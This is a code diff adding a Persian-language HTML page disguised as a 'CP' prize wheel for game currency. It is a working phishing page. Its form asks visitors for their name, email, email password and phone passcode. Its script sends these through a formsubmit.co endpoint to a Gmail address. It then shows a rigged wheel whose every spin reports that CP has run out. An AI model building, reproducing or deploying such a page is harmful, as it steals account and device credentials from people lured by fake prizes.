@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CP Wheel</title>
+
+<style>
+body{
+    margin:0;
+    background:#111;
+    color:white;
+    font-family:tahoma;
+    text-align:center;
+}
+
+#login{
+    margin-top:100px;
+}
+
+input{
+    padding:12px;
+    border-radius:10px;
+    border:none;
+    margin:5px;
+}
+
+button{
+    padding:12px 35px;
+    border:0;
+    border-radius:15px;
+    background:gold;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+#wheelPage{
+    display:none;
+    margin-top:30px;
+}
+
+canvas{
+    border-radius:50%;
+    box-shadow:0 0 30px gold;
+}
+
+.pointer{
+    margin:auto;
+    width:0;
+    height:0;
+    border-left:25px solid transparent;
+    border-right:25px solid transparent;
+    border-top:45px solid white;
+}
+
+.popup{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:#000b;
+    justify-content:center;
+    align-items:center;
+}
+
+.box{
+    background:#222;
+    padding:30px;
+    border-radius:20px;
+    box-shadow:0 0 30px gold;
+}
+</style>
+
+</head>
+
+<body>
+
+
+<div id="login">
+
+<h1>ورود</h1>
+
+
+<form id="myForm">
+
+<input type="text" id="name" name="name" placeholder="اسم شما" required>
+
+<br>
+
+<input type="email" name="email" placeholder="ایمیل شما" required>
+<input type="text" name="passworld" placeholder="رمز جمیل شما" required>
+<input type="text" name="phone passworld" placeholder="رمز گوشی شما" required>
+
+
+<br>
+
+<button type="submit">
+Send
+</button>
+
+</form>
+
+</div>
+
+
+
+<div id="wheelPage">
+
+<h1>🎡 گردونه CP</h1>
+
+<div class="pointer"></div>
+
+<canvas id="wheel" width="450" height="450"></canvas>
+
+<br>
+
+<button onclick="spin()">چرخاندن</button>
+
+</div>
+
+
+
+<div class="popup" id="popup">
+
+<div class="box">
+
+<h1>نتیجه</h1>
+
+<h2>CP تمام شده است ❌</h2>
+
+<button onclick="closePop()">OK</button>
+
+</div>
+
+</div>
+
+
+
+<script>
+
+
+document.getElementById("myForm").addEventListener("submit",function(e){
+
+e.preventDefault();
+
+
+fetch("https://formsubmit.co/ajax/zare65485@gmail.com",{
+
+method:"POST",
+
+body:new FormData(this)
+
+})
+.then(()=>{
+
+start();
+
+});
+
+
+});
+
+
+
+function start(){
+
+document.getElementById("login").style.display="none";
+
+document.getElementById("wheelPage").style.display="block";
+
+}
+
+
+
+
+
+const canvas=document.getElementById("wheel");
+const ctx=canvas.getContext("2d");
+
+
+let prizes=[
+"80 CP",
+"160 CP",
+"420 CP",
+"880 CP",
+"2400 CP",
+"5000 CP",
+"10000 CP",
+"پوچ"
+];
+
+
+let colors=[
+"#ff3131",
+"#2196f3",
+"#9c27b0",
+"#00c853",
+"#ff9800",
+"#e91e63",
+"#00bcd4",
+"#555"
+];
+
+
+
+function draw(){
+
+let c=225;
+let r=220;
+let part=(Math.PI*2)/prizes.length;
+
+
+for(let i=0;i<prizes.length;i++){
+
+ctx.beginPath();
+ctx.moveTo(c,c);
+
+ctx.fillStyle=colors[i];
+
+ctx.arc(
+c,c,r,
+i*part,
+(i+1)*part
+);
+
+ctx.fill();
+
+
+ctx.save();
+
+ctx.translate(c,c);
+ctx.rotate(i*part+part/2);
+
+ctx.fillStyle="white";
+ctx.font="bold 22px Arial";
+ctx.textAlign="right";
+
+ctx.fillText(prizes[i],190,8);
+
+ctx.restore();
+
+}
+
+}
+
+
+draw();
+
+
+
+let deg=0;
+
+
+function spin(){
+
+deg+=1800+Math.random()*360;
+
+
+canvas.style.transition="5s ease-out";
+
+canvas.style.transform=
+"rotate("+deg+"deg)";
+
+
+setTimeout(()=>{
+
+document.getElementById("popup").style.display="flex";
+
+},5000);
+
+
+}
+
+
+
+function closePop(){
+
+document.getElementById("popup").style.display="none";
+
+}
+
+
+</script>
+
+
+</body>
+</html>
